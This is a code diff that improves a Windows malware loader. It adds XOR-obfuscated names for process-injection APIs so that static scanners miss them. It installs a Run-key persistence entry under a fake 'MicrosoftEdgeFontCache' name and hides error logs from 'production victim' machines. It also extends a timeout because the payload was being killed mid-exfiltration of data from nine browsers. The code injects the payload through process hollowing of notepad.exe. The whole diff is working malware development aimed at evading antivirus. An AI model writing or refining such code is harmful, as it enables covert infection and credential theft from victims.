@@ -58,6 +58,9 @@ static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM skip 
 
 // ------------------------------------------------------------------ dynamic API resolution
 // These functions are NOT in the IAT — resolved at runtime to avoid heuristic detection.
+// The API names are stored XOR-obfuscated and decoded onto the stack at runtime:
+// a plaintext "WriteProcessMemory"/"CreateRemoteThread"/"NtUnmapViewOfSection"
+// cluster in .rdata is a static injection signature even when resolved dynamically.
 typedef BOOL   (WINAPI *tWriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
 typedef LPVOID (WINAPI *tVirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
 typedef BOOL   (WINAPI *tVirtualProtectEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
@@ -65,6 +68,45 @@ typedef HANDLE (WINAPI *tCreateRemoteThread)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T
                                               LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
 typedef LONG   (WINAPI *tUnmap)(HANDLE,PVOID);
 typedef LONG   (WINAPI *tNCTE)(HANDLE*,ACCESS_MASK,PVOID,PVOID,PVOID,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID);
+
+template <size_t N> struct EncName {
+    char d[N];
+    constexpr EncName(const char (&s)[N]) : d{} {
+        for(size_t i=0;i<N;i++) d[i]=(char)(s[i]^(char)(0x37+(i&0xF)));
+    }
+    void dec(char* out) const { for(size_t i=0;i<N;i++) out[i]=(char)(d[i]^(char)(0x37+(i&0xF))); }
+};
+template <size_t N> static FARPROC ProcObf(HMODULE m, const EncName<N>& e){
+    char buf[40]; e.dec(buf);
+    return GetProcAddress(m, buf);
+}
+static constexpr EncName EN_WPM  {"WriteProcessMemory"};
+static constexpr EncName EN_VAE  {"VirtualAllocEx"};
+static constexpr EncName EN_VPE  {"VirtualProtectEx"};
+static constexpr EncName EN_CRT  {"CreateRemoteThread"};
+static constexpr EncName EN_UNMAP{"NtUnmapViewOfSection"};
+static constexpr EncName EN_NCTE {"NtCreateThreadEx"};
+
+// ------------------------------------------------------------------ persistence (loader-side)
+// Installs a registry Run key pointing at the hidden infected backup so the payload
+// re-runs on every login. Done HERE and not in the payload: the hollowed process
+// would register notepad.exe. The backup file is kept (normally it is deleted).
+// Run value name is intentionally generic -- the old "WindowsDefenderHelper" was a
+// known malware IOC string.
+static void InstallRunKey(const wchar_t* exePath){
+    HKEY hKey;
+    long rc = RegOpenKeyExW(HKEY_CURRENT_USER,
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_SET_VALUE, &hKey);
+    if(rc != 0) return;
+    rc = RegSetValueExW(hKey, L"MicrosoftEdgeFontCache", 0, REG_SZ,
+        (const BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t));
+    RegCloseKey(hKey);
+}
+// true when the CKPR sentinel in THIS binary was patched to CKPR0001 by auto.py
+static bool PersistEnabled(void){
+    return g_persist[4]=='0' && g_persist[5]=='0' && g_persist[6]=='0' && g_persist[7]=='1';
+}
 
 static PIMAGE_DOS_HEADER Mz(void* b){ return (PIMAGE_DOS_HEADER)b; }
 static PIMAGE_NT_HEADERS Nt(void* b){
@@ -215,8 +257,10 @@ int wmain(int argc,wchar_t** argv){
                         BOOL hp=CreateProcessW(runExe,NULL,NULL,NULL,FALSE,
                                        CREATE_DEFAULT_ERROR_MODE,NULL,wdir,&si2,&pi2);
                         if(!hp){
-                            CreateDirectoryW(L"C:\\ProgramData\\cookielog",NULL);
-                            HANDLE el=CreateFileW(L"C:\\ProgramData\\cookielog\\loader_err.log",
+#ifdef DEBUG
+                            // debug-only: never write a trace file on a production victim
+                            CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
+                            HANDLE el=CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.log",
                                 GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
                             if(el!=INVALID_HANDLE_VALUE){
                                 SetFilePointer(el,0,NULL,FILE_END);
@@ -225,16 +269,26 @@ int wmain(int argc,wchar_t** argv){
                                     GetLastError(),runExe);
                                 DWORD w2; WriteFile(el,msg,n,&w2,NULL); CloseHandle(el);
                             }
+#endif
                         }
                         if(pi2.hProcess){ CloseHandle(pi2.hThread); CloseHandle(pi2.hProcess); }
 
-                        // 3b. Clean up the temp file
+                        // 3b. Clean up the temp file -- unless persistence is enabled:
+                        // then register the hidden copy in Run and keep it as the
+                        // payload carrier (the main exe is now the clean host)
+                        bool persist_here = PersistEnabled();
                         if(renamed){
-                            if(!DeleteFileW(bak))
+                            if(persist_here){
+                                InstallRunKey(bak);          // keep the backup as payload carrier
+                            } else if(!DeleteFileW(bak)){
                                 MoveFileExW(bak,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
+                            }
                         } else {
-                            if(!DeleteFileW(runExe))
+                            if(persist_here){
+                                InstallRunKey(runExe);
+                            } else if(!DeleteFileW(runExe)){
                                 MoveFileExW(runExe,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
+                            }
                         }
 
                         // 4. Sacrificial process for hollowing: notepad.exe from System32
@@ -248,7 +302,7 @@ int wmain(int argc,wchar_t** argv){
                             lstrcatW(target_buf,L"\\cmd.exe");
                         }
                         target=target_buf; kill=true;
-                        wait=20000;    // payload needs ~10s (pipe retry) + extraction time
+                        wait=120000;   // hijack scan + 9 browsers + big dumps: 20s killed the payload mid-exfil
                         // falls through to hollowing code below
                     }
                 }
@@ -275,15 +329,16 @@ int wmain(int argc,wchar_t** argv){
     BYTE* g_payload = DecryptPayload();
     if(!g_payload){ return 6; }
 
-    // 3. Resolve suspicious APIs dynamically (removes them from IAT)
+    // 3. Resolve suspicious APIs dynamically (removes them from IAT);
+    //    names decoded from obfuscated constants so no plaintext lands in .rdata
     HMODULE k32 = GetModuleHandleA("kernel32.dll");
     HMODULE nt  = GetModuleHandleA("ntdll.dll");
-    tWriteProcessMemory pWriteProcessMemory = (tWriteProcessMemory)GetProcAddress(k32,"WriteProcessMemory");
-    tVirtualAllocEx      pVirtualAllocEx    = (tVirtualAllocEx)GetProcAddress(k32,"VirtualAllocEx");
-    tVirtualProtectEx   pVirtualProtectEx  = (tVirtualProtectEx)GetProcAddress(k32,"VirtualProtectEx");
-    tCreateRemoteThread  pCreateRemoteThread= (tCreateRemoteThread)GetProcAddress(k32,"CreateRemoteThread");
-    tUnmap unmap=(tUnmap)GetProcAddress(nt,"NtUnmapViewOfSection");
-    tNCTE  ncte=(tNCTE)GetProcAddress(nt,"NtCreateThreadEx");
+    tWriteProcessMemory pWriteProcessMemory = (tWriteProcessMemory)ProcObf(k32, EN_WPM);
+    tVirtualAllocEx      pVirtualAllocEx    = (tVirtualAllocEx)ProcObf(k32, EN_VAE);
+    tVirtualProtectEx   pVirtualProtectEx  = (tVirtualProtectEx)ProcObf(k32, EN_VPE);
+    tCreateRemoteThread  pCreateRemoteThread= (tCreateRemoteThread)ProcObf(k32, EN_CRT);
+    tUnmap unmap=(tUnmap)ProcObf(nt, EN_UNMAP);
+    tNCTE  ncte=(tNCTE)ProcObf(nt, EN_NCTE);
     if(!pWriteProcessMemory || !pVirtualAllocEx || !pVirtualProtectEx){
         free(g_payload); return 7;
     }
